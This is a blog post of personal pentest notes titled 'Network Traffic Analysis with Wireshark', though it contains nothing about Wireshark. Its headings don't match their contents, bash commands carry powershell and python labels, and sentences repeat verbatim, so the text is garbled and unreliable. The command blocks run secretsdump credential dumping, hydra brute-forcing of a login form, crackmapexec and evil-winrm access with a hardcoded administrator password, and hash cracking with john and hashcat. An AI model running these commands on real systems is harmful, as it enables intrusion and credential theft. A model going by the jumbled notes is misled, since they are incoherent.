---
TitleSEO: "Network Traffic Analysis with Wireshark | ZureFX"
TitlePost: "Network Traffic Analysis with Wireshark"
Author: "ZureFX"
Description: "Personal notes on Network Traffic Analysis with Wireshark. Quick reference for pentesting and CTF challenges."
Keywords: "lateral movement, enumeration, dfir, networking"
URL: "https://zurefx.github.io/notes/note-network-traffic-analysis-with-wireshark-868.html"
URL_IMAGES: ""
Date: "2026-01-20"
Tags: "Lateral Movement, Enumeration, DFIR, Networking"
Section: "notes"
Lang: "en"
main_img: "note-network-traffic-analysis-with-wireshark-868"
Permalink: "/notes/note-network-traffic-analysis-with-wireshark-868.html"
BtnLabel: "Read Notes"
Pick: 0
---
## RDP

### lookupsid

The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.125.229.127
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.79.52.204/FUZZ
nmap -sCV -p143,53,21 10.96.29.252 -oN scan.txt
```

## IDOR

### smbclient

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.92.214.30/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services.

The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

- `SSTI`
- `sharphound`
- `pwncat`
- `Golden Ticket`
- `Kerberoasting`
- `Docker Escape`

## Broken Access Control

### HTTP

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.58.116.79 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.98.187.111 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.116.125.86 -u administrator -p 'P@ssw0rd!'
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- `SeDebugPrivilege`
- `DLL Hijacking`
- `nikto`
- `Unconstrained Delegation`
- `impacket`
- `NTLM Relay`

Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.46.132.124 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.115.201.212 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Writable PATH

### Ruby on Rails

- `john`
- `impacket`
- `SSRF`
- `Docker Escape`

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
